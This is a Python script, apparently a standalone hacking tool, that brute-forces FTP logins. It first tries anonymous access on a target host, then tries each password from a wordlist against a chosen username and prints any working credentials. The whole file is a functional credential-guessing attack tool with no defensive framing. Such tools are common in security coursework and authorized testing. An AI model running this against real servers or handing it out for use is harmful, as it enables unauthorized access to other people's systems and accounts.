import ftplib
import sys
import argparse

argparser = argparse.ArgumentParser(description='FTP BruteForcer')
argparser.add_argument('--host', help='Host to be bruteforced', default='localhost')
argparser.add_argument('-u', '--username', help='Username to be bruteforced', default='admin')
argparser.add_argument('-w', '--wordlist', help='Wordlist file', default='passwords.txt')

parsed_args = argparser.parse_args()

host = parsed_args.host
username = parsed_args.username
wordlist = parsed_args.wordlist

def connect(host,user,password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user=user, passwd = password)
        ftp.quit()
        return True

    except Exception as e:
        return False

def main():
    print('[+] Using anonymous credentials for ' + host)

    if connect(host, 'anonymous', ''):
        print('[+] FTP Anonymous logon succeeded on host: {}'.format(host))
        exit(0)
    else:
        print('[-] FTP Anonymous logon failed on host : {}'.format(host))

    try:
        with open(wordlist, 'r') as f:
            pass
    except FileNotFoundError:
        print('[-] File not found: {}'.format(wordlist))
        exit(1)

    with open(wordlist, 'r') as f:
        for line in f:
            password = str(line.replace('\n',''))
            print("Testing: " + password)
            if connect(host,username,password):
                print("[+] FTP Logon succeeded on host: {} using username: {} and password: {}".format(host,username,password))
                exit(0)
            else:
                print("[-] FTP Logon failed on host: {} using username: {} and password: {}".format(host,username,password))

if __name__ ==  "__main__":
        main()
